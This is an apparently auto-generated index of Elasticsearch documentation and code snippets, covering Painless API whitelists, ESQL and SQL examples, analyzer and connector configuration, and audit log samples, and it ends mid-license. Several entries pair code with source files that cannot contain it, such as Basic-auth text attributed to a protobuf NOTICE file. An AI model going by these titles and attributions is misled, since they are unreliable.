Custom field name parsing for dotted notation in MapXContentParser\nDESCRIPTION: This method extracts a field name from a parser context, specifically handling the case of multi-level field paths with dot notation. It preserves special field names beginning with underscore and implements logic to navigate through the nested structure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/src/test/resources/org/elasticsearch/ingest/attachment/test/sample-files/text-empty.txt#2025-04-21_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\n@Override\npublic XContentParser.Token nextToken() throws IOException {\n    token = delegate.nextToken();\n    if (token == XContentParser.Token.FIELD_NAME) {\n        String name = delegate.currentName();\n        if (name.indexOf('.') > 0) {\n            // If field name starts with '_', we're in a metadata field and we leave the name as is\n            if (name.charAt(0) == '_') {\n                return token;\n            }\n\n            // Save the path of multi-part field names for later reference\n            path = XContentMapValues.parsePathComponents(name);\n        }\n    }\n    return token;\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Query DSL Settings\nDESCRIPTION: Setting to control whether expensive queries are allowed in Elasticsearch. This setting can be used to prevent execution of queries that may impact cluster stability due to high computational costs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/querydsl.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"search.allow_expensive_queries\": false\n```\n\n----------------------------------------\n\nTITLE: Manipulating Bit Sets in Java\nDESCRIPTION: This snippet defines the BitSet class which allows for the manipulation of bits within a set. Major functionalities include setting, clearing, and flipping bits, as well as operations like AND, OR, and XOR.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_8\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.BitSet {\n  ()\n  (int)\n  void and(BitSet)\n  void andNot(BitSet)\n  int cardinality()\n  void clear()\n  void clear(int)\n  void clear(int,int)\n  def clone()\n  void flip(int)\n  void flip(int,int)\n  boolean intersects(BitSet)\n  boolean isEmpty()\n  int length()\n  int nextClearBit(int)\n  int nextSetBit(int)\n  void or(BitSet)\n  int previousClearBit(int)\n  int previousSetBit(int)\n  void set(int)\n  void set(int,int)\n  void set(int,int,boolean)\n  int size()\n  byte[] toByteArray()\n  long[] toLongArray()\n  BitSet valueOf(long[])\n  void xor(BitSet)\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Czech Custom Analyzer in Elasticsearch\nDESCRIPTION: This snippet provides a method to create a custom analyzer for Czech language text in Elasticsearch. It features stop words and keyword filtering, along with a stemmer for effective text analysis. The stop words can be overwritten as per requirements.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_8\n\nLANGUAGE: json\nCODE:\n```\nPUT /czech_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"czech_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_czech_\" <1>\n        },\n        \"czech_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"příklad\"] <2>\n        },\n        \"czech_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"czech\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_czech\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"czech_stop\",\n            \"czech_keywords\",\n            \"czech_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including ABS Function Description in Markdown\nDESCRIPTION: Includes the content of a separate Markdown file containing the description of the ABS function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/abs.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/abs.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Example of POWER Function with Positive Exponents\nDESCRIPTION: Demonstrates using the POWER function with positive integer exponents, calculating 3² and 3³.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_21\n\nLANGUAGE: sql\nCODE:\n```\nSELECT POWER(3, 2), POWER(3, 3);\n\n  POWER(3, 2)  |  POWER(3, 3)\n---------------+---------------\n9.0            |27.0\n```\n\n----------------------------------------\n\nTITLE: Text Expansion Query with Pruning and Rescoring in Elasticsearch\nDESCRIPTION: Advanced example that implements token pruning to improve query performance by removing non-significant tokens. It also uses a rescore function to mitigate shard-level inconsistencies that might occur with pruned tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-text-expansion-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET my-index/_search\n{\n   \"query\":{\n      \"text_expansion\":{\n         \"ml.tokens\":{\n            \"model_id\":\".elser_model_2\",\n            \"model_text\":\"How is the weather in Jamaica?\",\n            \"pruning_config\": {\n               \"tokens_freq_ratio_threshold\": 5,\n               \"tokens_weight_threshold\": 0.4,\n               \"only_score_pruned_tokens\": false\n           }\n         }\n      }\n   },\n   \"rescore\": {\n      \"window_size\": 100,\n      \"query\": {\n         \"rescore_query\": {\n            \"text_expansion\": {\n               \"ml.tokens\": {\n                  \"model_id\": \".elser_model_2\",\n                  \"model_text\": \"How is the weather in Jamaica?\",\n                  \"pruning_config\": {\n                     \"tokens_freq_ratio_threshold\": 5,\n                     \"tokens_weight_threshold\": 0.4,\n                     \"only_score_pruned_tokens\": true\n                  }\n               }\n            }\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a Point Geometry using WKT in Elasticsearch\nDESCRIPTION: Adds a document to the 'example' index with a Point geometry specified in Well-Known Text (WKT) format. The coordinates are provided as longitude (-77.03653) and latitude (38.897676).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"POINT (-77.03653 38.897676)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Index Setup with Rank Features in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to set up an index in Elasticsearch with various rank feature fields such as pagerank, url_length, and topics. These fields are used to boost document relevance scores in search queries. It is necessary to have Elasticsearch installed and running. The index configuration includes field types and score impact settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-rank-feature-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /test\n{\n  \"mappings\": {\n    \"properties\": {\n      \"pagerank\": {\n        \"type\": \"rank_feature\"\n      },\n      \"url_length\": {\n        \"type\": \"rank_feature\",\n        \"positive_score_impact\": false\n      },\n      \"topics\": {\n        \"type\": \"rank_features\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Synonym Records\nDESCRIPTION: These lines define synonym or related term records using a structured format, likely for Elasticsearch. Each record follows the pattern s(id, sequence, term, type, flag1, flag2), specifying an identifier (100000001), a sequence number (1, 2, 3), the term ('abstain', 'refrain', 'desist'), a type ('v'), and two flags (1, 0). This data associates multiple terms under a single identifier.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/analysis-common/src/test/resources/org/elasticsearch/analysis/common/synonyms_wordnet.txt#_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\ns(100000001,1,'abstain',v,1,0).\ns(100000001,2,'refrain',v,1,0).\ns(100000001,3,'desist',v,1,0).\n```\n\n----------------------------------------\n\nTITLE: Using 'by' Keyword in EQL Sequences\nDESCRIPTION: Shows how to use the 'by' keyword in EQL sequence queries to match events that share the same values. Includes examples of combining 'sequence by' with 'with maxspan'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_14\n\nLANGUAGE: eql\nCODE:\n```\nsequence\n  [ file where file.extension == \"exe\" ] by user.name, file.path\n  [ process where true ] by user.name, process.executable\n```\n\nLANGUAGE: eql\nCODE:\n```\nsequence by user.name\n  [ file where file.extension == \"exe\" ] by file.path\n  [ process where true ] by process.executable\n```\n\nLANGUAGE: eql\nCODE:\n```\nsequence by user.name with maxspan=15m\n  [ file where file.extension == \"exe\" ]\n  [ process where true ]\n```\n\n----------------------------------------\n\nTITLE: Optimized Match Query for Suffix Search in Elasticsearch\nDESCRIPTION: An optimized version of the suffix wildcard query using a match query against the reversed field. This approach uses text analysis to reverse the query terms for matching with the reversed indexed tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nPUT /my_queries2/_doc/2?refresh\n{\n  \"query\": {\n    \"match\": { <1>\n      \"my_field.suffix\": \"xyz\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Identity HashMap Implementation in Java\nDESCRIPTION: This snippet defines the IdentityHashMap class, which is a hash table implementation that compares keys based on reference equality instead of object equality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_22\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.IdentityHashMap {\n  ()\n  (Map)\n  def clone()\n}\n```\n\n----------------------------------------\n\nTITLE: Running Self-Managed Connector in Docker (Dockerized)\nDESCRIPTION: This command runs the self-managed connector Docker image with the shared volume and network. It mounts the configuration directory and the `extraction-service-volume`, connects to the `elastic` network, and executes the `elastic-ingest` command with the specified configuration file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\n$ docker run \\\n  -v ~/connectors-config:/config \\\n  -v extraction-service-volume:/app/files \\\n  --network \"elastic\" \\\n  --tty \\\n  --rm \\\n  docker.elastic.co/integrations/elastic-connectors:$CONNECTOR_CLIENT_VERSION \\\n  /app/bin/elastic-ingest \\\n  -c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Initial Comment About File Generation\nDESCRIPTION: Header comment indicating the file is auto-generated by ESQL's AbstractFunctionTestCase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/match.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Input Document Structure with Array of Attachments\nDESCRIPTION: Example JSON document showing the structure of array-based attachments with base64 encoded data that needs to be processed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"attachments\" : [\n    {\n      \"filename\" : \"ipsum.txt\",\n      \"data\" : \"dGhpcyBpcwpqdXN0IHNvbWUgdGV4dAo=\"\n    },\n    {\n      \"filename\" : \"test.txt\",\n      \"data\" : \"VGhpcyBpcyBhIHRlc3QK\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL TO_LONG Function Document Structure\nDESCRIPTION: A markdown template structure for the TO_LONG function documentation in ESQL. It includes sections for syntax with an embedded image, parameters, description, types, and examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_long.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `TO_LONG` [esql-to_long]\n\n**Syntax**\n\n:::{image} ../../../images/functions/to_long.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/to_long.md\n:::\n\n:::{include} ../description/to_long.md\n:::\n\n:::{include} ../types/to_long.md\n:::\n\n:::{include} ../examples/to_long.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Evaluating X-Pack Plugin Snapshot-Based Recoveries (File: build.gradle)\nDESCRIPTION: This snippet configures the evaluation of the 'snapshot-based-recoveries' plugin for the GCS, license enforcement, and various storage backends using a Gradle build file structure. It sets up specific QA tests based on the provided paths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_7\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:snapshot-based-recoveries:qa:fs\nEvaluating project ':x-pack:plugin:snapshot-based-recoveries:qa:fs' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/snapshot-based-recoveries/qa/fs/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:snapshot-based-recoveries:qa:gcs\nEvaluating project ':x-pack:plugin:snapshot-based-recoveries:qa:gcs' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/snapshot-based-recoveries/qa/gcs/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:snapshot-based-recoveries:qa:license-enforcing\nEvaluating project ':x-pack:plugin:snapshot-based-recoveries:qa:license-enforcing' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/snapshot-based-recoveries/qa/license-enforcing/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:snapshot-based-recoveries:qa:s3\nEvaluating project ':x-pack:plugin:snapshot-based-recoveries:qa:s3' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/snapshot-based-recoveries/qa/s3/build.gradle'.\n```\n\n----------------------------------------\n\nTITLE: Running Docker Image for Connector Service\nDESCRIPTION: This shell command demonstrates how to run a Docker image for the Elastic connectors service. It uses a bind mount to link the local configuration directory and specifies the network and other necessary flags for optimal operation. The command also points to the configuration YAML file necessary for setting up the connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-github.md#2025-04-21_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Wait on Quit in Elasticsearch YAML\nDESCRIPTION: When true, waits for a reply after sending the QUIT command. When false, closes the connection immediately after sending QUIT. Defaults to true.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_23\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.wait_on_quit\n```\n\n----------------------------------------\n\nTITLE: Reversing a Text String with REVERSE in ESQL\nDESCRIPTION: Demonstrates using the REVERSE function to reverse a simple text string. The function takes a string input and returns a new string with the characters in reverse order.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/reverse.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"Some Text\" | EVAL message_reversed = REVERSE(message);\n```\n\n----------------------------------------\n\nTITLE: Anonymous Access Denied Event Logging in Elasticsearch\nDESCRIPTION: JSON structure for logging access attempts that are denied due to missing authentication credentials.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-30T21:56:43,608+0200\", \"node.id\":\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"rest\", \"event.action\":\"anonymous_access_denied\", \"origin.type\":\"rest\", \"origin.address\":\"[::1]:50543\", \"url.path\":\"/twitter/_async_search\", \"url.query\":\"pretty\", \"request.method\":\"POST\", \"request.id\":\"TqA9OisyQ8WTl1ivJUV1AA\"}\n```\n\n----------------------------------------\n\nTITLE: Defining Long Class Methods and Constants in Java\nDESCRIPTION: This snippet shows the public methods and constants of the java.lang.Long class. It includes constants like MAX_VALUE and MIN_VALUE, and methods for bit manipulation, parsing, and comparing long values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_13\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Long {\n  int BYTES\n  long MAX_VALUE\n  long MIN_VALUE\n  int SIZE\n  int bitCount(long)\n  int compare(long,long)\n  int compareTo(Long)\n  int compareUnsigned(long,long)\n  Long decode(String)\n  long divideUnsigned(long,long)\n  int hashCode(long)\n  long highestOneBit(long)\n  long lowestOneBit(long)\n  long max(long,long)\n  long min(long,long)\n  int numberOfLeadingZeros(long)\n  int numberOfTrailingZeros(long)\n  long parseLong(String)\n  long parseLong(String,int)\n  long parseUnsignedLong(String)\n  long parseUnsignedLong(String,int)\n  long remainderUnsigned(long,long)\n  long reverse(long)\n  long reverseBytes(long)\n  long rotateLeft(long,int)\n  long rotateRight(long,int)\n  int signum(long)\n  long sum(long,long)\n  String toBinaryString(long)\n  String toHexString(long)\n  String toOctalString(long)\n  String toString(long)\n  String toString(long,int)\n  String toUnsignedString(long)\n  String toUnsignedString(long,int)\n  Long valueOf(long)\n  Long valueOf(String,int)\n}\n```\n\n----------------------------------------\n\nTITLE: Implicit Boxing/Unboxing in Painless\nDESCRIPTION: Demonstrates implicit boxing and unboxing between primitive types and their corresponding reference types in Painless. It highlights how boxing/unboxing occurs during operations like adding an integer to a `List` and retrieving an integer from a `List`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_10\n\nLANGUAGE: painless\nCODE:\n```\nList l = new ArrayList();       <1>\nl.add(1);                       <2>\nInteger I = Integer.valueOf(0); <3>\nint i = l.get(i);               <4>\n```\n\n----------------------------------------\n\nTITLE: Nori Analyzer Configuration Example\nDESCRIPTION: Example showing how to configure a custom analyzer with nori_tokenizer and nori_part_of_speech filter to remove Korean numerals.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-speech.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT nori_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"tokenizer\": \"nori_tokenizer\",\n            \"filter\": [\n              \"my_posfilter\"\n            ]\n          }\n        },\n        \"filter\": {\n          \"my_posfilter\": {\n            \"type\": \"nori_part_of_speech\",\n            \"stoptags\": [\n              \"NR\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n\nGET nori_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"여섯 용이\"\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Post-Increment Operator in Painless\nDESCRIPTION: This snippet shows how to use the post-increment operator '++' with different numeric types in Painless. It demonstrates the operator's behavior, including type promotion and implicit casting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nshort i = 0;\ni++;\nlong j = 1;\nlong k;\nk = j++;\n```\n\n----------------------------------------\n\nTITLE: Primitive Types Equality Not Equals Examples\nDESCRIPTION: Shows equality not equals operations between different primitive numeric types with implicit type promotion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_18\n\nLANGUAGE: painless\nCODE:\n```\nint a = 1;\ndouble b = 2.0;\nboolean c = a != b;\nc = 1 != a;\n```\n\n----------------------------------------\n\nTITLE: Including STD_DEV Function Parameters\nDESCRIPTION: Includes the content of a separate file containing the parameters for the STD_DEV function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/std_dev.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/std_dev.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Securing TransformerFactory Instantiation\nDESCRIPTION: Warns against direct usage of TransformerFactory and recommends using SamlUtils#getHardenedXMLTransformer() method for secure XML transformation\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/forbidden/xml-signatures.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\njavax.xml.transform.TransformerFactory#newInstance()\n```\n\nLANGUAGE: java\nCODE:\n```\njavax.xml.transform.TransformerFactory#newInstance(java.lang.String, java.lang.ClassLoader)\n```\n\n----------------------------------------\n\nTITLE: Converting IP Strings with Leading Zeros as Octal in ESQL\nDESCRIPTION: Shows how TO_IP() can parse IPv4 addresses with leading zeros as octal values by setting the 'leading_zeros' parameter to 'octal'. This behavior is similar to tools like ping or ftp.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_ip.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW s = \"1.1.010.1\" | EVAL ip = TO_IP(s, {\"leading_zeros\":\"octal\"})\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Authentication Flow with Base64-encoded Credentials\nDESCRIPTION: Example of an authentication process in Elasticsearch using Base64-encoded credentials. This shows how credentials are extracted from the HTTP Authorization header and decoded for authentication.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/vector-tile/licenses/protobuf-java-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nGET /\nAuthorization: Basic <base64 encoded credentials>\n```\n\n----------------------------------------\n\nTITLE: Defining SHA Functions in Painless API\nDESCRIPTION: This snippet defines methods for generating SHA hash digests in the Elasticsearch Painless scripting environment. The methods 'sha1', 'sha256', and 'sha512' return string representations of the respective hash digests.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update.txt#2025-04-21_snippet_0\n\nLANGUAGE: groovy\nCODE:\n```\nclass java.lang.String {\n  String org.elasticsearch.painless.api.Augmentation sha1()\n  String org.elasticsearch.painless.api.Augmentation sha256()\n  String org.elasticsearch.painless.api.Augmentation sha512()\n}\n```\n\n----------------------------------------\n\nTITLE: BigInteger Class Definition in Painless\nDESCRIPTION: Defines the available methods and constants for BigInteger class including arithmetic, bitwise operations, and number theory functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.math.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass java.math.BigInteger {\n  BigInteger ONE\n  BigInteger TEN\n  BigInteger ZERO\n  (String)\n  (String,int)\n  BigInteger abs()\n  BigInteger add(BigInteger)\n  BigInteger and(BigInteger)\n  BigInteger andNot(BigInteger)\n  int bitCount()\n  int bitLength()\n  byte byteValueExact()\n  BigInteger clearBit(int)\n  int compareTo(BigInteger)\n  BigInteger divide(BigInteger)\n  BigInteger[] divideAndRemainder(BigInteger)\n  BigInteger flipBit(int)\n  BigInteger gcd(BigInteger)\n  int getLowestSetBit()\n  int intValueExact()\n  long longValueExact()\n  BigInteger max(BigInteger)\n  BigInteger min(BigInteger)\n  BigInteger mod(BigInteger)\n  BigInteger modInverse(BigInteger)\n  BigInteger modPow(BigInteger,BigInteger)\n  BigInteger multiply(BigInteger)\n  BigInteger negate()\n  BigInteger not()\n  BigInteger or(BigInteger)\n  BigInteger pow(int)\n  BigInteger remainder(BigInteger)\n  BigInteger setBit(int)\n  BigInteger shiftLeft(int)\n  BigInteger shiftRight(int)\n  short shortValueExact()\n  int signum()\n  BigInteger subtract(BigInteger)\n  boolean testBit(int)\n  byte[] toByteArray()\n  String toString(int)\n  BigInteger valueOf(long)\n  BigInteger xor(BigInteger)\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Rare Terms Aggregation in Elasticsearch\nDESCRIPTION: Demonstrates the basic syntax for a rare terms aggregation, showing the required 'field' parameter and optional 'max_doc_count' parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-rare-terms-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"rare_terms\": {\n    \"field\": \"the_field\",\n    \"max_doc_count\": 1\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating API Key for SharePoint Server Connector\nDESCRIPTION: Example of creating an API key for the SharePoint Server connector using the Elasticsearch API. This key is used for authentication and authorization of the connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint.md#2025-04-22_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using FIRST/FIRST_VALUE Function in Elasticsearch SQL\nDESCRIPTION: The FIRST function returns the first non-null value of a specified field sorted by an optional ordering field. If no ordering field is provided, only the target field is used for sorting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nFIRST(\n    field_name               <1>\n    [, ordering_field_name]) <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT FIRST(a) FROM t\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT FIRST(a, b) FROM t\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT FIRST(first_name) FROM emp;\n\n   FIRST(first_name)\n--------------------\nAlejandro\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender, FIRST(first_name) FROM emp GROUP BY gender ORDER BY gender;\n\n   gender   |   FIRST(first_name)\n------------+--------------------\nnull        |   Berni\nF           |   Alejandro\nM           |   Amabile\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT FIRST(first_name, birth_date) FROM emp;\n\n   FIRST(first_name, birth_date)\n--------------------------------\nRemzi\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender, FIRST(first_name, birth_date) FROM emp GROUP BY gender ORDER BY gender;\n\n    gender    |   FIRST(first_name, birth_date)\n--------------+--------------------------------\nnull          |   Lillian\nF             |   Sumant\nM             |   Remzi\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender, FIRST_VALUE(first_name, birth_date) FROM emp GROUP BY gender ORDER BY gender;\n\n    gender    |   FIRST_VALUE(first_name, birth_date)\n--------------+--------------------------------------\nnull          |   Lillian\nF             |   Sumant\nM             |   Remzi\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender, FIRST_VALUE(SUBSTRING(first_name, 2, 6), birth_date) AS \"first\" FROM emp GROUP BY gender ORDER BY gender;\n\n    gender     |     first\n---------------+---------------\nnull           |illian\nF              |umant\nM              |emzi\n```\n\n----------------------------------------\n\nTITLE: Concatenating String Array with MV_CONCAT in ESQL\nDESCRIPTION: This snippet demonstrates how to use MV_CONCAT to join elements of a string array into a single string, separated by a specified delimiter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_concat.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[\"foo\", \"zoo\", \"bar\"]\n| EVAL j = MV_CONCAT(a, \", \")\n```\n\n----------------------------------------\n\nTITLE: Brics Automaton Copyright Notice\nDESCRIPTION: Copyright notice and BSD-style license terms for Brics automaton code used in Lucene's automaton package\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-icu/licenses/lucene-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright (c) 2001-2009 Anders Moeller\n * All rights reserved.\n * \n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n * 3. The name of the author may not be used to endorse or promote products\n *    derived from this software without specific prior written permission.\n * \n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR\n * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.\n * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n * THIS SOFTWARE, EVEN IF ADVISED 